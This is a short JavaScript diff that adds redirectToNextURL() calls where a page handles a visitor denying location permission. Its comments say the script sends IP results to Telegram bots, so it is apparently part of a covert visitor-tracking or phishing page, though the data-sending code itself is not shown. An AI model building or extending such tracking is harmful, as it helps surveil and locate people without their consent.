@@ -23,6 +23,7 @@
         (error) => {
           if (error.code === error.PERMISSION_DENIED) {
             showAlert();
+            redirectToNextURL();
             // Location permission denied, send IP result to Telegram bots
           }
         }
@@ -162,6 +163,7 @@ async function yourFunction() {
       (error) => {
         if (error.code === error.PERMISSION_DENIED) {
           showAlert();
+redirectToNextURL();
           // Location permission denied, send IP result to Telegram bots
         }
       }
@@ -202,6 +204,8 @@ yourFunction();
       // Deny button clicked or dialog closed
     //  console.log("Denied");
 showAlert();
+
+
 
     }
   }
